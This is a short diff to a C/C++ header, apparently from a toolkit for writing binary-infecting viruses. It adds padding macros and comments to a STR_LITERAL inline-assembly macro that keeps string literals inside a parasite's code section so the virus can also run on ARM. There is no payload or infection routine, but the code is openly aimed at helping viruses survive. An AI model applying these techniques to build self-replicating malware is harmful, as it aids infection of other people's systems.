@@ -59,8 +59,10 @@
 // up in .text instead of in .rodata, which is preferred for parasites.
 // For example:
 //   const char* str = nullptr;
-//   STR_LITERAL(str, "this binary is infected\\n");
+//   STR_LITERAL(str, PAD3("this binary is infected\\n"));
 //   write(1, str, strlen(str));
+// Even though it's no required to pad literals to align the next instruction on
+// x86, it's best to do it so your virus also run on arm.
 #if defined(__x86_64__)
 #define STR_LITERAL(str, literal) \
   asm volatile(                   \
@@ -75,6 +77,11 @@
       "3:\n"                      \
       : "=r"(str)                 \
       :);
+// For x86 dword alignment is not a requirement but a performance improvement.
+// Size is an important factor for viruses to survive so we do not insert NOP.
+#define PAD1(literal) literal
+#define PAD2(literal) literal
+#define PAD3(literal) literal
 
 #elif defined(__aarch64__)
 // Unfortunately arm must run instructions aligned to 4-byte addresses.
